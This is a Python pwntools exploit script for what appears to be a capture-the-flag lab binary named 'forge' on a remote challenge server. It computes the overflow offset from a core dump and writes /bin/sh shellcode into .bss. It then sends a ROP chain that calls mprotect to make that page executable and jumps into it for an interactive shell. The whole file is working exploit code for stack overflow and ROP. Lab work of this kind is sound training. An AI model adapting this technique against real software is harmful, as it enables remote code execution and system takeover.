#!/usr/bin/env python3
from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13529

context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab8/challenges/01_forge/forge', checksec=False)
context.arch = 'amd64'

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_ret_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b"shellcode:\n")
    p_crash.sendline(b"dummy")
    p_crash.recvuntil(b"Input:\n")
    p_crash.sendline(cyclic(200))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_value = core.read(core.rsp, 4)
    
    offset = cyclic_find(crash_value)
    print(f"Calculated offset to RIP: {offset}")
    return offset

OFFSET_TO_RIP = get_ret_offset()

shellcode = asm(shellcraft.sh())
shellcode_addr = elf.sym.shellcode
page = shellcode_addr & ~0xfff

r=conn()

# Stage 1: send shellcode into .bss
r.recvuntil(b'Send shellcode:')
r.send(shellcode.ljust(0x400, b'\x90')) #shellcode padded to exactly 0x400 bytes using NOPs.

# Stage 2: ROP chain
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(elf.sym.ret_gadget),
    p64(elf.sym.pop_rdi_ret), p64(page),        # mprotect arg 1: page address where shellcode sits in .bss
    p64(elf.sym.pop_rsi_ret), p64(0x1000),      # mprotect arg 2: size of the page, 4096 bytes (0x1000)
    p64(elf.sym.pop_rdx_ret), p64(7),           # mprotect arg 3: permissions. 7 grants R,W,X
    p64(elf.plt.mprotect),
    p64(shellcode_addr),                        # after mprotect can jump to shellcode that is now executable
)

r.recvuntil(b'Input:')
r.send(payload)
r.interactive()
